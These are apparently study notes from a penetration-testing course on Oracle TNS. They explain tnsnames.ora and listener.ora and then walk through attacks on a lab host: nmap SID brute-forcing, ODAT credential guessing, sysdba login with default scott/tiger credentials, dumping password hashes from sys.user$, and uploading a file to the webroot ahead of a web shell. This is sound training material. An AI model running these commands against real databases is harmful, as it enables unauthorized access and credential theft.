---
title: Oracle TNS
description: oracle
---

<!-- ![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/3af77eaa-2067-4012-8f99-416adebc73a4/c5998107-aa30-40f1-a79c-ee8dd6b68be6/image.png) -->

- is communication protocol that facilitates communication between oracle database and application over network
- TNS supports various networking protocol such as IPX/SPX and TCP/IP protocol stacks
- preferred for managing large, complex databases in health care, finance, etc
- new TNS supports  IPv6 and SSL/TLS encryption which makes suitable for following:
    - Name resolution
    - Connection management
    - Load Balancing
    - Security

# **Default Configuration**

- By default, the listener listens for incoming connections on the TCP/1521 port
- how ever this port can be changed during installation or later in the configuration file

TNS listener is configured to support various network protocols:

- TCP/IP
- UDP
- IPX/SPX
- AppleTalk

- By default, Oracle TNS can be remotely managed in Oracle 8i/9i but not in Oracle 10g/11g
- TNS listener also includes basic security features
    - listener will only accept the connection from authorized hosts
    - authentication needs combination of hostnames, IP add, username and password
    - 
- listener use Oracle Net Services for encryption for communication
    - configuration files for Oracle TNS are called tnsnames.ora and listener.ora
    - typically located in the $ORACLE_HOME/network/admin directory
    - The plain text contain configuration information for Oracle databases
    
- Oracle 9 has default password as “CHANGE_ON_INSTALL”
- Each database or service has a unique entry in the [tnsnames.ora](https://docs.oracle.com/cd/E11882_01/network.112/e10835/tnsnames.htm#NETRF007) file, contain necessary info for client to connect to the service

### **Tnsnames.ora**

```
ORCL =
  (DESCRIPTION =
    (ADDRESS_LIST =
      (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))
    )
    (CONNECT_DATA =
      (SERVER = DEDICATED)
      (SERVICE_NAME = orcl)
    )
  )
```

- the tnsnames.ora file can contain many such entries for different databases and services
- On the other hand listner.ora file is a server-side configuration file that defines the listener process properties and parameter

### **Listener.ora**

```
SID_LIST_LISTENER =
  (SID_LIST =
    (SID_DESC =
      (SID_NAME = PDB1)
      (ORACLE_HOME = C:\oracle\product\19.0.0\dbhome_1)
      (GLOBAL_DBNAME = PDB1)
      (SID_DIRECTORY_LIST =
        (SID_DIRECTORY =
          (DIRECTORY_TYPE = TNS_ADMIN)
          (DIRECTORY = C:\oracle\product\19.0.0\dbhome_1\network\admin)
        )
      )
    )
  )

LISTENER =
  (DESCRIPTION_LIST =
    (DESCRIPTION =
      (ADDRESS = (PROTOCOL = TCP)(HOST = orcl.inlanefreight.htb)(PORT = 1521))
      (ADDRESS = (PROTOCOL = IPC)(KEY = EXTPROC1521))
    )
  )

ADR_BASE_LISTENER = C:\oracle
```

- client-side uses the tnsnames.ora file to resolve service names to network addresses
- listener process uses listener.ora
- Oracle databases can protected by using so-called PL/SQL Exclusion List (PlsqlExclusionList)
    - it needs to be placed in  in the $ORACLE_HOME/sqldeveloper directory

| **Setting** | **Description** |
| --- | --- |
| `DESCRIPTION` | Provides a **name** for the database and its **connection type**. |
| `ADDRESS` | The **network address** of the database, including the **hostname** and **port number**. |
| `PROTOCOL` | The **network protocol** used for communication with the server (e.g., TCP/IP). |
| `PORT` | The **port number** used for communication with the server. |
| `CONNECT_DATA` | Specifies the **attributes of the connection**, such as the service name, SID, protocol, and instance identifier. |
| `INSTANCE_NAME` | The **name of the database instance** the client wants to connect to. |
| `SERVICE_NAME` | The **name of the service** that the client wants to connect to. |
| `SERVER` | The type of **server** used for the database connection (e.g., dedicated or shared). |
| `USER` | The **username** used to authenticate with the database server. |
| `PASSWORD` | The **password** used to authenticate with the database server. |
| `SECURITY` | The **security type** used for the connection (e.g., SSL, encrypted connection). |
| `VALIDATE_CERT` | Specifies whether to **validate the certificate** using SSL/TLS. |
| `SSL_VERSION` | The **SSL/TLS version** to use for the connection (e.g., TLSv1.2). |
| `CONNECT_TIMEOUT` | The **time limit** in seconds for the client to establish a connection to the database. |
| `RECEIVE_TIMEOUT` | The **time limit** in seconds for the client to receive a response from the database. |
| `SEND_TIMEOUT` | The **time limit** in seconds for the client to send a request to the database. |
| `SQLNET.EXPIRE_TIME` | The **time limit** in seconds for the client to detect if a connection has failed. |
| `TRACE_LEVEL` | The level of **tracing** for the database connection (e.g., basic or detailed). |
| `TRACE_DIRECTORY` | The **directory** where trace files are stored. |
| `TRACE_FILE_NAME` | The **name** of the trace file. |
| `LOG_FILE` | The file where the **log information** is stored. |

### **Oracle-Tools-setup.sh**

```python
#!/bin/bash

sudo apt-get install libaio1 python3-dev alien -y
git clone https://github.com/quentinhardy/odat.git
cd odat/
git submodule init
git submodule update
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
export LD_LIBRARY_PATH=instantclient_21_12:$LD_LIBRARY_PATH
export PATH=$LD_LIBRARY_PATH:$PATH
pip3 install cx_Oracle
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor passlib python-libnmap
sudo apt-get install build-essential libgmp-dev -y
pip3 install pycryptodome
```

### **Testing ODAT (Oracle Database Attacking Tool)**

```python
[!bash!]$ ./odat.py -h

usage: odat.py [-h] [--version]
               {all,tnscmd,tnspoison,sidguesser,snguesser,passwordguesser,utlhttp,httpuritype,utltcp,ctxsys,externaltable,dbmsxslprocessor,dbmsadvisor,utlfile,dbmsscheduler,java,passwordstealer,oradbg,dbmslob,stealremotepwds,userlikepwd,smb,privesc,cve,search,unwrapper,clean}
               ...

            _  __   _  ___ 
           / \|  \ / \|_ _|
          ( o ) o ) o || | 
           \_/|__/|_n_||_| 
-------------------------------------------
  _        __           _           ___ 
 / \      |  \         / \         |_ _|
( o )       o )         o |         | | 
 \_/racle |__/atabase |_n_|ttacking |_|ool 
-------------------------------------------

By Quentin Hardy (quentin.hardy@protonmail.com or quentin.hardy@bt.com)
...SNIP...
```

- designed to enumerate and exploit vulnerabilities in Oracle databases
- used to identify and exploit various security flaws in Oracle databases, including SQL injection, remote code execution, and privilege escalation

**Nmap**

```python
[!bash!]$ sudo nmap -p1521 -sV 10.129.204.235 --open

Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 10:59 EST
Nmap scan report for 10.129.204.235
Host is up (0.0041s latency).

PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.64 seconds
```

- Needs SID(system identifier) is a unique name that identifies a particular database instance
- can have multiple instances
- if client doesn’t specify SID the default is defined in tnsnames.ora

### **Nmap - SID Bruteforcing**

```python
[!bash!]$ sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute

Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 11:01 EST
Nmap scan report for 10.129.204.235
Host is up (0.0044s latency).

PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
| oracle-sid-brute: 
|_  XE

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.40 seconds
```

- We can use the [odat.py](http://odat.py/) tool to perform a variety of scans to enumerate and gather information about the Oracle database services and its components.
- those scan can retrieve database name, version running processes, user accounts, vulnerabilities, misconfigurations, etc

### **ODAT**

```python
[!bash!]$ ./odat.py all -s 10.129.204.235

[+] Checking if target 10.129.204.235:1521 is well configured for a connection...
[+] According to a test, the TNS listener 10.129.204.235:1521 is well configured. Continue...

...SNIP...

[!] Notice: 'mdsys' account is locked, so skipping this username for password           #####################| ETA:  00:01:16 
[!] Notice: 'oracle_ocm' account is locked, so skipping this username for password       #####################| ETA:  00:01:05 
[!] Notice: 'outln' account is locked, so skipping this username for password           #####################| ETA:  00:00:59
[+] Valid credentials found: scott/tiger. Continue...

...SNIP...
```

### **SQLplus - Log In**

```python
[!bash!]$ sqlplus scott/tiger@10.129.204.235/XE

SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:19:21 2023
Version 21.4.0.0.0

Copyright (c) 1982, 2021, Oracle. All rights reserved.

ERROR:
ORA-28002: the password will expire within 7 days

Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

SQL> 
```

[here](https://stackoverflow.com/questions/27717312/sqlplus-error-while-loading-shared-libraries-libsqlplus-so-cannot-open-shared).

```python
[!bash!]$ sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
```

- there are many [SQLplus commands](https://docs.oracle.com/cd/E11882_01/server.112/e41085/sqlqraa001.htm#SQLQR985) that we can enumerate database manually

### **Oracle RDBMS - Interaction**

```python
SQL> select table_name from all_tables;

TABLE_NAME
------------------------------
DUAL
SYSTEM_PRIVILEGE_MAP
TABLE_PRIVILEGE_MAP
STMT_AUDIT_OPTION_MAP
AUDIT_ACTIONS
WRR$_REPLAY_CALL_FILTER
HS_BULKLOAD_VIEW_OBJ
HS$_PARALLEL_METADATA
HS_PARTITION_COL_NAME
HS_PARTITION_COL_TYPE
HELP

...SNIP...

SQL> select * from user_role_privs;

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SCOTT                          CONNECT                        NO  YES NO
SCOTT                          RESOURCE                       NO  YES NO
```

### **Oracle RDBMS - Database Enumeration**

```python
[!bash!]$ sqlplus scott/tiger@10.129.204.235/XE as sysdba

SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:32:58 2023
Version 21.4.0.0.0

Copyright (c) 1982, 2021, Oracle. All rights reserved.

Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

SQL> select * from user_role_privs;

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS                            ADM_PARALLEL_EXECUTE_TASK      YES YES NO
SYS                            APEX_ADMINISTRATOR_ROLE        YES YES NO
SYS                            AQ_ADMINISTRATOR_ROLE          YES YES NO
SYS                            AQ_USER_ROLE                   YES YES NO
SYS                            AUTHENTICATEDUSER              YES YES NO
SYS                            CONNECT                        YES YES NO
SYS                            CTXAPP                         YES YES NO
SYS                            DATAPUMP_EXP_FULL_DATABASE     YES YES NO
SYS                            DATAPUMP_IMP_FULL_DATABASE     YES YES NO
SYS                            DBA                            YES YES NO
SYS                            DBFS_ROLE                      YES YES NO

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS                            DELETE_CATALOG_ROLE            YES YES NO
SYS                            EXECUTE_CATALOG_ROLE           YES YES NO
...SNIP...
```

we could retrieve the password hashes from the sys.user$ and crack online

### **Oracle RDBMS - Extract Password Hashes**

```python
SQL> select name, password from sys.user$;NAME                           PASSWORD
------------------------------ ------------------------------
SYS                            FBA343E7D6C8BC9D
PUBLIC
CONNECT
RESOURCE
DBA
SYSTEM                         B5073FE1DE351687
SELECT_CATALOG_ROLE
EXECUTE_CATALOG_ROLE
DELETE_CATALOG_ROLE
OUTLN                          4A3BA55E08595C81
EXP_FULL_DATABASE

NAME                           PASSWORD
------------------------------ ------------------------------
IMP_FULL_DATABASE
LOGSTDBY_ADMINISTRATOR
...SNIP...
```

- another option is to upload web shell to the target, but this requires to run web server
- we need to know location of the root directory for the webserver
- or have to know what kind of system we are dealing with
- Linux ⇒ /var/www/html
- Windows ⇒ C:\inetpub\wwwroot

### **Oracle RDBMS - File Upload**

```python
[!bash!]$ echo "Oracle File Upload Test" > testing.txt
[!bash!]$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt

[1] (10.129.204.235:1521): Put the ./testing.txt local file in the C:\inetpub\wwwroot folder like testing.txt on the 10.129.204.235 server                                                                                                  
[+] The ./testing.txt file was created on the C:\inetpub\wwwroot directory on the 10.129.204.235 server like the testing.txt file
```y
